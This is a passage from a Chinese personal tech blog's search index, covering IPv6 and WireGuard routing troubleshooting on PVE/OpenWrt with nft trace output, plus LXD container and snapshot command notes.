Forwarding\u8bbe\u7f6e\uff1a\u9996\u5148\uff0c\u786e\u4fddPVE\u5bbf\u4e3b\u673a\u4e0a\u542f\u7528\u4e86IPv6\u8f6c\u53d1\u529f\u80fd\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u68c0\u67e5\uff1a     <code>sysctl net.ipv6.conf.all.forwarding</code>     \u5982\u679c\u8fd4\u56de\u503c\u4e3a1\uff0c\u8868\u793a\u5df2\u542f\u7528IPv6\u8f6c\u53d1\u3002\u5982\u679c\u8fd4\u56de\u503c\u4e3a0\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u542f\u7528\u5b83\uff1a     <code>sysctl -w net.ipv6.conf.all.forwarding=1</code>     \u4e3a\u4e86\u4f7f\u6b64\u66f4\u6539\u6301\u4e45\u5316\uff0c\u60a8\u53ef\u4ee5\u5c06\u5b83\u6dfb\u52a0\u5230 <code>/etc/sysctl.conf</code> \u6587\u4ef6\u4e2d\u3002</p> <ol> <li> <p>LXC\u5bb9\u5668\u7f51\u7edc\u914d\u7f6e\uff1a\u786e\u4fddLXC\u5bb9\u5668\u5185\u7684GRETAP\u8bbe\u5907\u548cbr-wan\u63a5\u53e3\u6b63\u786e\u914d\u7f6e\u3002\u68c0\u67e5GRETAP\u8bbe\u5907\u7684IPv6\u5730\u5740\u3001\u5b50\u7f51\u548c\u8def\u7531\u662f\u5426\u6b63\u786e\u8bbe\u7f6e\u3002\u786e\u4fddGRETAP\u8bbe\u5907\u80fd\u591f\u6b63\u786e\u8def\u7531IPv6\u6d41\u91cf\u3002</p> </li> <li> <p>\u5bb9\u5668\u5185\u9632\u706b\u5899\u89c4\u5219\uff1a\u5982\u679cLXC\u5bb9\u5668\u5185\u6709\u9632\u706b\u5899\u89c4\u5219\uff0c\u786e\u4fdd\u5b83\u4eec\u4e0d\u4f1a\u963b\u6b62IPv6\u6d41\u91cf\u4eceGRETAP\u8bbe\u5907\u4f20\u9012\u5230br-wan\u63a5\u53e3\u3002\u60a8\u53ef\u80fd\u9700\u8981\u5728\u5bb9\u5668\u5185\u7684\u9632\u706b\u5899\u89c4\u5219\u4e2d\u6dfb\u52a0\u5141\u8bb8IPv6\u6d41\u91cf\u901a\u8fc7\u7684\u89c4\u5219\u3002</p> </li> <li> <p>PVE\u5bbf\u4e3b\u673a\u7f51\u7edc\u6865\u914d\u7f6e\uff1a\u786e\u4fddPVE\u5bbf\u4e3b\u673a\u4e0a\u7684\u7f51\u7edc\u6865\uff08vmbr0\u548cbr-wan\uff09\u6b63\u786e\u914d\u7f6e\uff0c\u4ee5\u5141\u8bb8IPv6\u6d41\u91cf\u6b63\u786e\u4f20\u9012\u3002\u68c0\u67e5\u5b83\u4eec\u7684IPv6\u5730\u5740\u3001\u5b50\u7f51\u548c\u8def\u7531\u8bbe\u7f6e\u3002</p> </li> <li> <p>LXC\u5bb9\u5668\u95f4\u9694\u79bb\u8bbe\u7f6e\uff1a\u8bf7\u786e\u4fdd\u5728PVE\u5bbf\u4e3b\u673a\u7684\u7f51\u7edc\u914d\u7f6e\u4e2d\uff0cLXC\u5bb9\u5668\u4e4b\u95f4\u7684\u7f51\u7edc\u9694\u79bb\u8bbe\u7f6e\u4e0d\u4f1a\u963b\u6b62IPv6\u6d41\u91cf\u7684\u4f20\u9012\u3002\u8fd9\u53ef\u80fd\u9700\u8981\u8c03\u6574\u5b89\u5168\u7ec4\u6216\u7f51\u7edc\u9694\u79bb\u89c4\u5219\u3002</p> </li> <li> <p>MTU\u8bbe\u7f6e\uff1a\u5728\u591a\u5c42\u865a\u62df\u5316\u7f51\u7edc\u4e2d\uff0cMTU\uff08\u6700\u5927\u4f20\u8f93\u5355\u5143\uff09\u95ee\u9898\u53ef\u80fd\u4f1a\u5bfc\u81f4\u901a\u4fe1\u95ee\u9898\u3002\u786e\u4fdd\u5404\u4e2a\u7f51\u7edc\u8bbe\u5907\u7684MTU\u8bbe\u7f6e\u6b63\u786e\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5bfc\u81f4\u5206\u6bb5\u6216\u4e22\u5931\u6570\u636e\u5305\u3002</p> </li> <li> <p>\u7f51\u7edc\u6293\u5305\uff1a\u5982\u679c\u95ee\u9898\u4ecd\u7136\u5b58\u5728\uff0c\u60a8\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u7f51\u7edc\u8bbe\u5907\u4e0a\u4f7f\u7528\u6293\u5305\u5de5\u5177\uff08\u5982Wireshark\u6216tcpdump\uff09\u6765\u6355\u83b7IPv6\u6d41\u91cf\uff0c\u4ee5\u4fbf\u66f4\u8be6\u7ec6\u5730\u5206\u6790\u95ee\u9898\u5e76\u627e\u51fa\u6545\u969c\u7684\u4f4d\u7f6e\u3002</p> </li> </ol> <p>\u8bf7\u6839\u636e\u4e0a\u8ff0\u5efa\u8bae\u9010\u6b65\u68c0\u67e5\u548c\u8c03\u6574\u60a8\u7684\u7f51\u7edc\u914d\u7f6e\uff0c\u4ee5\u89e3\u51b3IPv6 RS\u62a5\u6587\u65e0\u6cd5\u6b63\u786e\u4f20\u9012\u7684\u95ee\u9898\u3002\u786e\u4fdd\u5728\u66f4\u6539\u7f51\u7edc\u914d\u7f6e\u4e4b\u524d\u5907\u4efd\u91cd\u8981\u6570\u636e\uff0c\u4ee5\u9632\u610f\u5916\u53d1\u751f\u3002</p> <p>\u4e0a\u9762\u63d0\u5230\u7684\uff1a</p> <p>\u786e\u4fdd\u5b83\u4eec\u4e0d\u4f1a\u963b\u6b62IPv6\u6d41\u91cf\u4eceGRETAP\u8bbe\u5907\u4f20\u9012\u5230br-wan\u63a5\u53e3\u3002</p> <p>\u771f\u7684\u8ba9\u6211\u627e\u5230\u4e86\u95ee\u9898\uff01</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u76f8\u5173\u5c0f\u5b9e\u9a8c","title":"\u76f8\u5173\u5c0f\u5b9e\u9a8c","text":"","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u7ed5\u8def\u8fd4\u56dewan\u53e3\u8fdb\u5165-wg\u63a5\u53e3\u8fd4\u56de","title":"\u7ed5\u8def\u8fd4\u56de\uff1awan\u53e3\u8fdb\u5165, wg\u63a5\u53e3\u8fd4\u56de","text":"<p>\u7f51\u7edc\u60c5\u51b5 - op2\uff08\u53d1\u8d77ping\uff09     - eth0: 114.214.173.252 - king3399\uff08\u54cd\u5e94ping\uff09     - eth0: 222.195.90.107     - wg0: endpoint op1, default route - op1\uff08\u8def\u7531\u4e2d\u8f6c\uff09     - br-wan: 114.214.236.72</p> <p>icmp request op2(eth0) -&gt; king(eth0) - route\u8d70\u5b66\u6821</p> <p>icmp reply king(eth0) -&gt; op2(eth0) - route\u901a\u8fc7wg0\uff0c\u53d1\u9001\u7ed9op1 - op1\u518d\u8f6c\u53d1\uff0c\u4ecebr-wan\u51fa\u53bb\uff0c\u5230\u8fbeop2</p> <p>op1\u6536\u5230king\u7684icmp reply\u518d\u8f6c\u53d1\uff0c\u5b9e\u9645\u6709\u4e24\u4e2a\u969c\u788d 1. op1\u5c06wg0\u6536\u5230\u7684src\u5730\u5740\u4e3aop2(eth0)\u7684\u5305\u4e22\u5f03\uff0c\u56e0\u4e3a\u4e0d\u5728allow ip\u4e2d\u3002\u89e3\u51b3\u529e\u6cd5\uff1aallow ip\u8bbe\u7f6e\u4e3a0.0.0.0\uff0c\u5173\u95ed\u81ea\u52a8\u6dfb\u52a0\u8def\u7531 2. op1 wg0\u6536\u5230\u5305\u540e\uff0c\u5374\u53d1\u73b0\u5e76\u6ca1\u6709\u4ecewan\u53e3\u53d1\u9001\u51fa\u53bb</p> <p>\u4ee5\u4e0b\u662f\u5bf9\u95ee\u98982\u7684\u63a2\u7a76</p> <p>\u9996\u5148king\u4e0a\u7b26\u5408\u9884\u671f\uff0c\u4eceeth0\u6536\u5230icmp request\uff0c\u4ecewg0\u8fd4\u56deicmp reply <pre><code>tcpdump -ni any icmp and host 222.195.90.107\n\n22:08:20.292237 eth0  In  IP 114.214.173.252 &gt; 222.195.90.107: ICMP echo request, id 65124, seq 5, length 64\n22:08:20.292430 wg0   Out IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 65124, seq 5, length 64\n</code></pre></p> <p>\u95ee\u9898\u51fa\u73b0\u5728op1\uff0c\u53ef\u4ee5\u770b\u5230wg0\u6536\u5230\u4e86\u5305\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u4efb\u4f55output <pre><code>root@op1 \u279c  ~ tcpdump -ni any icmp and host 114.214.173.252\n\n22:09:22.298394 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 65124, seq 67, length 64\n22:09:23.298654 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 65124, seq 68, length 64\n</code></pre></p> <p>\u7814\u7a76\u540e\u53d1\u73b0\u4f7f\u7528nft trace\u53ef\u4ee5\u8ffd\u8e2a\u5305\u5728\u9632\u706b\u5899\u4e2d\u7684\u5904\u7406\u987a\u5e8f - trace id\u6807\u8bc6\u4e00\u4e2a\u5305 - \u53ef\u4ee5\u770b\u5230\u4f9d\u6b21\u7ecf\u8fc7\u4ee5\u4e0bchain\u5904\u7406\uff0c\u7ed3\u5c3e\u7684verdict\uff08\u5224\u51b3\uff09\u8868\u793a\u5904\u7406\u7ed3\u679c     - raw_prerouting     - mangle_prerouting     - prerouting     - mangle_forward     - forward         - \u5728\u8fd9\u91cc\u5339\u914d<code>meta nfproto ipv4 oifname { \"br-wan\", \"gre4t-gre1\" } ct state invalid counter drop</code>\u89c4\u5219\uff0c\u7136\u540e\u88abdrop\u4e86 <pre><code>trace id 146d2af5 inet fw4 debug packet: iif \"wg0\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 debug rule iifname \"wg0\" ip saddr 222.195.90.107 meta nftrace set 1 counter packets 4 bytes 336 (verdict continue)\ntrace id 146d2af5 inet fw4 debug verdict continue\ntrace id 146d2af5 inet fw4 debug policy accept\ntrace id 146d2af5 inet fw4 raw_prerouting packet: iif \"wg0\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 raw_prerouting verdict continue\ntrace id 146d2af5 inet fw4 raw_prerouting policy accept\ntrace id 146d2af5 inet fw4 mangle_prerouting packet: iif \"wg0\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 mangle_prerouting verdict continue\ntrace id 146d2af5 inet fw4 mangle_prerouting policy accept\ntrace id 146d2af5 inet fw4 prerouting packet: iif \"wg0\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 prerouting rule iifname { \"wg0\", \"br-lan\", \"ztyou4dlov\" } jump helper_lan comment \"!fw4: Handle lan IPv4/IPv6 helper assignment\" (verdict jump helper_lan)\ntrace id 146d2af5 inet fw4 helper_lan verdict continue\ntrace id 146d2af5 inet fw4 prerouting verdict continue\ntrace id 146d2af5 inet fw4 prerouting policy accept\ntrace id 146d2af5 inet fw4 mangle_forward packet: iif \"wg0\" oif \"br-wan\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 63 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 mangle_forward verdict continue\ntrace id 146d2af5 inet fw4 mangle_forward policy accept\ntrace id 146d2af5 inet fw4 forward packet: iif \"wg0\" oif \"br-wan\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 63 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 forward rule iifname { \"wg0\", \"br-lan\", \"ztyou4dlov\" } jump forward_lan comment \"!fw4: Handle lan IPv4/IPv6 forward traffic\" (verdict jump forward_lan)\ntrace id 146d2af5 inet fw4 forward_lan rule jump accept_to_wan comment \"!fw4: Accept lan to wan forwarding\" (verdict jump accept_to_wan)\ntrace id 146d2af5 inet fw4 accept_to_wan rule meta nfproto ipv4 oifname { \"br-wan\", \"gre4t-gre1\" } ct state invalid counter packets 31820 bytes 3109375 drop comment \"!fw4: Prevent NAT leakage\" (verdict drop)\n</code></pre></p> <p>\u901a\u8fc7nft\u4fee\u6539\u6389\u8be5drop\uff0c\u53d1\u73b0\u5c31\u80fdping\u901a\u4e86 op1\u4e0atcpdump\u53ef\u4ee5\u770b\u5230\u6b63\u786e\u4ecebr-wan\u8f6c\u53d1 <pre><code>23:38:13.018068 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 14312, seq 2631, length 64\n23:38:13.018089 br-wan Out IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 14312, seq 2631, length 64\n</code></pre></p> <p>op2\u548cking\u4e0a\u90fd\u80fd\u770b\u5230conntrack\u4fe1\u606f <pre><code>root@op2 \u279c  ~ conntrack -L -p icmp -d 222.195.90.107\nicmp     1 29 src=114.214.173.252 dst=222.195.90.107 type=8 code=0 id=31588 packets=112 bytes=9408 src=222.195.90.107 dst=114.214.173.252 type=0 code=0 id=31588 packets=104 bytes=8736 mark=0 use=1\nconntrack v1.4.8 (conntrack-tools): 1 flow entries have been shown.\n</code></pre> \u4e0d\u8fc7op1\u4e0a\u6ca1\u6709\uff08\u96be\u9053\u8f6c\u53d1\u4e0d\u7b97\uff1f\uff09 <pre><code>root@op1 \u279c  ~ conntrack -L -p icmp |grep 222.195.90.107\nconntrack v1.4.8 (conntrack-tools): 151 flow entries have been shown.\n</code></pre></p> <p>\u4f46\u662f\u8be5\u89c4\u5219\u5230\u5e95\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1fct invalid\u4e3a\u4ec0\u4e48\u4f1a\u5339\u914d\uff1f</p> <p>\u8fde\u63a5\u8ddf\u8e2a\u662f Linux \u5185\u6838\u4e2d\u7684\u4e00\u9879\u529f\u80fd\uff0c\u7528\u4e8e\u8ddf\u8e2a\u7f51\u7edc\u8fde\u63a5\u7684\u72b6\u6001\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u8fde\u63a5\u8ddf\u8e2a\u72b6\u6001\uff1a 1. <code>new</code>\uff08\u65b0\u8fde\u63a5\uff09\uff1a\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u65b0\u7684\u3001\u5c1a\u672a\u5efa\u7acb\u7684\u8fde\u63a5\u3002 2. <code>established</code>\uff08\u5df2\u5efa\u7acb\uff09\uff1a\u8868\u793a\u8fde\u63a5\u5df2\u7ecf\u6210\u529f\u5efa\u7acb\uff0c\u6570\u636e\u53ef\u4ee5\u5728\u6e90\u548c\u76ee\u6807\u4e4b\u95f4\u4f20\u8f93\u3002 3. <code>related</code>\uff08\u76f8\u5173\u8fde\u63a5\uff09\uff1a\u8868\u793a\u8fd9\u662f\u4e0e\u73b0\u6709\u8fde\u63a5\u76f8\u5173\u7684\u65b0\u8fde\u63a5\uff0c\u4f8b\u5982 FTP \u6570\u636e\u8fde\u63a5\u4e0e FTP \u63a7\u5236\u8fde\u63a5\u7684\u5173\u7cfb\u3002 4. <code>untracked</code>\uff08\u672a\u8ddf\u8e2a\uff09\uff1a\u8868\u793a\u8fde\u63a5\u672a\u88ab\u8fde\u63a5\u8ddf\u8e2a\u7cfb\u7edf\u8ddf\u8e2a\u3002 5. <code>snat</code>\uff08\u6e90 NAT\uff09\uff1a\u8868\u793a\u8fde\u63a5\u7ecf\u8fc7\u6e90\u5730\u5740\u8f6c\u6362\u3002 6. <code>dnat</code>\uff08\u76ee\u6807 NAT\uff09\uff1a\u8868\u793a\u8fde\u63a5\u7ecf\u8fc7\u76ee\u6807\u5730\u5740\u8f6c\u6362\u3002 7. <code>tracert</code>\uff08\u8ddf\u8e2a\u8def\u7531\uff09\uff1a\u8868\u793a\u8fd9\u662f\u4e00\u4e2a ICMP \u8ddf\u8e2a\u8def\u7531\u7684\u8fde\u63a5\u3002 8. <code>dying</code>\uff08\u5173\u95ed\u4e2d\uff09\uff1a\u8868\u793a\u8fde\u63a5\u5373\u5c06\u5173\u95ed\u3002 9. <code>reply</code>\uff08\u56de\u590d\uff09\uff1a\u8868\u793a\u8fd9\u662f\u4e00\u4e2a ICMP Echo Reply \u62a5\u6587\u3002 10. <code>timeout</code>\uff08\u8d85\u65f6\uff09\uff1a\u8868\u793a\u8fde\u63a5\u5df2\u8d85\u65f6\u3002 11. <code>closed</code>\uff08\u5df2\u5173\u95ed\uff09\uff1a\u8868\u793a\u8fde\u63a5\u5df2\u5173\u95ed\u3002 12. <code>invalid</code>\uff08\u65e0\u6548\uff09\uff1a\u8868\u793a\u8fde\u63a5\u51fa\u73b0\u5f02\u5e38\u6216\u4e0d\u5408\u6cd5\u7684\u72b6\u6001\uff0c\u4f8b\u5982\uff0c\u8fde\u63a5\u7684\u62a5\u6587\u987a\u5e8f\u4e0d\u6b63\u786e\u7b49\u3002</p> <p><code>ct state invalid</code> \u5c31\u662f\u5339\u914d\u8fde\u63a5\u8ddf\u8e2a\u72b6\u6001\u4e3a \"invalid\" \u7684\u62a5\u6587\uff0c\u901a\u5e38\u8868\u793a\u8fde\u63a5\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u53ef\u80fd\u662f\u7531\u4e8e\u62a5\u6587\u7684\u987a\u5e8f\u4e0d\u6b63\u786e\u6216\u5176\u4ed6\u5f02\u5e38\u60c5\u51b5\u3002</p> <p>fw4\u89c4\u5219\u6ce8\u91ca\u4e2d\u63d0\u5230\u7684Prevent NAT leakage\uff0c\u641c\u7d22 LuCI option to enable/disable \"NAT Leakage Prevention\" - Installing and Using OpenWrt - OpenWrt Forum</p> <p>This rule is only generated for firewall zones with masquerading how in blazes would non-NATted/martian packets leak to the WAN?</p> <p>NAT leakage on 22.03 [fw4] - Installing and Using OpenWrt - OpenWrt Forum \u77e5\u9053\u4e86\u6709<code>masq_allow_invalid</code>\u8fd9\u4e48\u4e00\u4e2a\u9009\u9879[OpenWrt Wiki] Firewall configuration /etc/config/firewall</p> <code>masq_allow_invalid</code> boolean no <code>0</code> Do not add\u00a0<code>DROP INVALID</code>\u00a0rules, if masquerading is used. The\u00a0<code>DROP</code>\u00a0rules are supposed to prevent\u00a0NAT\u00a0leakage (see\u00a0commit in firewall3). <p>GUI\u4e2d\u89e3\u91ca\uff1a</p> <p>Do not install extra rules to reject forwarded traffic with conntrack state\u00a0invalid. This may be required for complex asymmetric route setups.</p> <p>NAT: Masquerade can leak private IP, why&amp;how? - MikroTik - \u5927\u6982\u5c31\u662f\u63a5\u53e3down\u518dup\uff0c\u6709\u4e00\u4e9b\u5305\u6ca1\u6709\u6b63\u786e\u7684ct\u72b6\u6001\uff0c\u4e0d\u4f1a\u7ecf\u8fc7masq\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/","title":"LXC\u4f7f\u7528","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#1-\u8bf4\u660e","title":"1 \u8bf4\u660e","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#lxc-vs-docker","title":"lxc vs docker","text":"<p>LXC\u662f\u4e00\u79cd\u8f7b\u91cf\u865a\u62df\u673a\uff0c\u590d\u7528host\u5185\u6838\u3002\u4e0edocker\u5c3d\u53ef\u80fd\u6bcf\u4e2a\u5bb9\u5668\u53ea\u8dd1\u4e00\u4e2a\u5e94\u7528\u4e0d\u540c\uff0clxc\u7684\u601d\u8def\u66f4\u63a5\u8fd1\u865a\u62df\u673a\u3002 </p> <p>The key networking difference between Docker and LXC is that with LXC one can attach a\u00a0container\u00a0to any bridge on the Host. This includes a bridge on the outside interface. Via\u00a0transparent bridging\u00a0the\u00a0container\u00a0can have unfettered access to the existing IPv6 subnet, including picking up Global Unique Addresses (GUAs) without the host having to do router-like functions, such as adding routes, auto propagation of prefixes (with DHCPv6-PD), redistribution of routes, etc. Again, things which Docker doesn't support.</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#lxc-vs-lxd","title":"lxc vs lxd","text":"<p>LXD is actually two parts, the\u00a0<code>lxd</code>\u00a0daemon, and the\u00a0<code>lxc</code>\u00a0CLI client which makes calls to the\u00a0<code>lxd</code>\u00a0daemon</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#2-get-started","title":"2 get started","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>ubuntu\u5b89\u88c5lxd\u4f1a\u4f7f\u7528snap\u3002 <pre><code>sudo apt install lxd\n</code></pre> \u8981\u60f3\u4f7f\u7528lxd\u65f6\u975e\u7ba1\u7406\u5458\uff0c\u9700\u8981\u5c06\u7528\u6237\u6dfb\u52a0\u5230lxd\u7ec4 p.s \u73b0\u5728\u5b89\u88c5\u65f6\u5df2\u7ecf\u81ea\u52a8\u6dfb\u52a0\u5230lxd\u7ec4\u4e86 <pre><code>sudo adduser {USERNameHere} lxd\n</code></pre> \u7b2c\u4e00\u6b21\u4f7f\u7528lxd\uff0c\u9700\u8981\u8fdb\u884c\u521d\u59cb\u5316\uff1a<code>sudo lxd init</code>\u3002\u521d\u59cb\u5316\u4f1a\u8bbe\u7f6e\u7f51\u7edc\u548c\u5b58\u50a8  \u53ef\u4ee5\u624b\u52a8\u67e5\u770b\u521d\u59cb\u5316\u7ed3\u679c <pre><code>lxc profile list  \nlxc profile show\u00a0default  \nlxc network list\nlxc storage list\n</code></pre></p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u955c\u50cf","title":"\u955c\u50cf","text":"<p>\u901a\u8fc7\u7f51\u7ad9\u67e5\u770b\uff1aLinux Containers - Image server \u6216\u547d\u4ee4\u884c <pre><code>lxc image list images: |grep ubuntu #\u67e5\u770b\u5b98\u65b9lxc\u955c\u50cf\n</code></pre></p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5bb9\u5668\u7ba1\u7406","title":"\u5bb9\u5668\u7ba1\u7406","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u521b\u5efa\u5bb9\u5668","title":"\u521b\u5efa\u5bb9\u5668","text":"<p><pre><code>lxc launch images:{**distro**}/{**version**}/{**arch**} {**container-name-here**}  #\u521b\u5efa\u5bb9\u5668\nlxc launch -p default -p extbridge images:ubuntu/jammy ubuntu22\nlxc launch -p default -p extbridge images:debian/10 debian10\n</code></pre> \u6216\u8005 <pre><code>lxc init local:openwrt-x86 openwrt\nlxc config edit openwrt #\u4e4b\u540e\u518d\u8fdb\u884c\u4fee\u6539\uff0c\u6bd4\u5982\u4fee\u6539\u5176\u4e2d\u7684profile\n</code></pre></p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7ba1\u7406","title":"\u7ba1\u7406","text":"<pre><code>lxc list/ls\n\nlxc start/stop/restart/delete {container-name}\n\nlxc info {container-name}\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u7f16\u8f91","title":"\u7f16\u8f91","text":"<pre><code>lxc config edit &lt;instance_name&gt;\nlxc config show &lt;instance_name&gt; --expaned\n\nlxc config device add &lt;instance_name&gt; &lt;device_name&gt; nic nictype=&lt;nic_type&gt; ...   #\u6dfb\u52a0\u4e00\u4e2a\u8bbe\u5907\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u81ea\u542f\u52a8","title":"\u81ea\u542f\u52a8","text":"<pre><code>lxc config set container_name boot.autostart true\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6267\u884c\u547d\u4ee4","title":"\u6267\u884c\u547d\u4ee4","text":"<pre><code>lxc exec containerName -- command  \nlxc exec containerName -- /path/to/script  \nlxc exec containerName --env EDITOR=/usr/bin/vim -- command\n\nlxc exec {container-name} {shell-name}     #\u83b7\u5f97shell\n\nlxc exec {container-name} --su --login yfy\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6587\u4ef6\u79fb\u52a8","title":"\u6587\u4ef6\u79fb\u52a8","text":"<pre><code>lxc file pull {continer-nane}/{path/to/file} {/path/to/local/dest}\nlxc file push {/path/to/file} {continer-nane}/path/to/dest/dir/\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#3-\u5feb\u7167","title":"3 \u5feb\u7167","text":"<p>lxc snapshot {container} {snapshot-name} lxc info {container} lxc restore {container} {snapshot-name} lxc delete {container}/{snapshot}</p> <pre><code>lxc snapshot debian docker_base_image\nlxc publish debian/docker_base_image --alias docker_image       # publish image to local:\n\n# start a lxc/docker container called docker1\nlxc launch -p default -p extbridge local:docker_image docker1\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#stateful\u5feb\u7167","title":"stateful\u5feb\u7167","text":"<ul> <li>1\uff1a\"Unable to create a stateful snapshot. CRIU isn't installed\" even when criu.enabled = true - LXD - Linux Containers Forum</li> </ul>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5feb\u7167\u5927\u5c0f","title":"\u5feb\u7167\u5927\u5c0f","text":"<p>zfs\u5feb\u7167\u4e0d\u662f\u7d2f\u52a0\u7684_cumulative_\uff0c\u800c\u662f\u5feb\u7167\u5efa\u7acb\u65f6\u548c\u6700\u65b0\u7684\u6587\u4ef6\u7cfb\u7edf\u5dee\u5f02\uff1a[ZFS] Destroy snapshots \u2013 nocin.eu \u8fd8\u6ca1\u6709\u5b9e\u73b0\uff1aCalculating snapshot size - LXD - Linux Containers Forum</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u6279\u91cf\u5220\u9664\u5feb\u7167","title":"\u6279\u91cf\u5220\u9664\u5feb\u7167","text":"<pre><code>lxc query \"/1.0/instances/op2/snapshots?recursion=1\" |jq -r '.[].name' | xargs -I SNAP echo lxc delete op2/SNAP\n\n# \u590d\u5236\u540e\u624b\u52a8\u6267\u884c\n</code></pre>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#4-storage","title":"4 storage","text":"<p>About storage pools, volumes and buckets - LXD documentation (linuxcontainers.org)</p>","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#storage-pool","title":"storage pool","text":"","tags":["lxc","lxd"]},{"location":"%E5%B7%A5%E5%85%B7/2022/11/06/2022-11-06-LXC%E4%BD%BF%E7%94%A8/#\u5b58\u50a8\u4f4d\u7f6e","title":"\u5b58\u50a8\u4f4d\u7f6e","text":"<ul> 